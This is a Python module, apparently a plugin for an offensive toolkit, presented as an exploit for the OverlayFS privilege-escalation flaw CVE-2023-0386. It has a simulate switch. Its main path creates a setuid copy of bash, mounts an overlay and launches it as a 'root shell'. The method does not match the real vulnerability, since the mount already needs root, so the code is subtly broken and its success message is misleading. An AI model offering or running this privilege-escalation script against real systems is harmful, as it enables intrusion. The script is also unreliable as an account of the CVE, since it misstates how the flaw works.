import os
import subprocess
import time

def run(container=None, simulate=False):
    print("[*] Running OverlayFS Exploit (CVE-2023-0386)...")

    if simulate:
        print("[SIMULATE] Would create SUID shell via OverlayFS mount")
        return "Simulated overlayfs exploitation run."

    try:
        workdir = "/tmp/overlayfs_exp"
        upperdir = os.path.join(workdir, "upper")
        lowerdir = os.path.join(workdir, "lower")
        work = os.path.join(workdir, "work")
        merged = os.path.join(workdir, "merged")
        suid_bin = "/bin/bash"

        # Prepare directory structure
        os.makedirs(upperdir, exist_ok=True)
        os.makedirs(lowerdir, exist_ok=True)
        os.makedirs(work, exist_ok=True)
        os.makedirs(merged, exist_ok=True)

        # Copy SUID binary to lowerdir
        lower_bin = os.path.join(lowerdir, "bash")
        subprocess.run(["cp", suid_bin, lower_bin], check=True)

        # Change ownership and permissions (simulate overlay behavior)
        subprocess.run(["chmod", "4755", lower_bin], check=True)

        # Mount overlay
        mount_cmd = [
            "mount", "-t", "overlay", "overlay",
            "-o", f"lowerdir={lowerdir},upperdir={upperdir},workdir={work}", merged
        ]
        subprocess.run(mount_cmd, check=True)

        # Execute SUID shell
        suid_shell = os.path.join(merged, "bash")
        if os.path.exists(suid_shell):
            print("[+] Exploit succeeded. Launching root shell from:", suid_shell)
            result = subprocess.run([suid_shell, "-p", "-c", "id"], capture_output=True, text=True)
            return f"Exploit success: {result.stdout.strip()}"
        else:
            return "Exploit failed: SUID shell not found in merged directory."

    except Exception as e:
        return f"Exploit failed: {str(e)}"